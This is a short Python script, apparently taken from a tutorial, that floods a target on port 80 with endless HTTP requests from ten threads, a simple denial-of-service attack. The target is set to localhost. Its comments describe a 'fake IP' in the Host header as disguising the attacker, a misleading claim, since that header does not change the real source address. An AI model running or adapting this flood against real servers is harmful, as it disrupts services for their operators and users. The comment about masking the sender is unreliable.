#https://www.neuralnine.com/code-a-ddos-script-in-python/
import socket
import threading
#the attack is very straightforward
targetIP = '127.0.0.1'
fakeIP = '182.21.20.32'
port = 80
def ddos():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #open a socket 
        s.connect((targetIP, port)) #connect to the targeted ip and port to attack him
        s.sendto(("GET /" + targetIP + " HTTP/1.1\r\n").encode('ascii'), (targetIP, port))
        s.sendto(("Host: " + fakeIP + "\r\n\r\n").encode('ascii'), (targetIP, port)) 
        s.close()
        # sending an http request(because in this case we are attacking port 80) using the fake ip
for i in range(10):    #initiating many threads
     thread = threading.Thread(target=ddos)
     thread.start()
     print("Connection number",i)
#initiating many threads
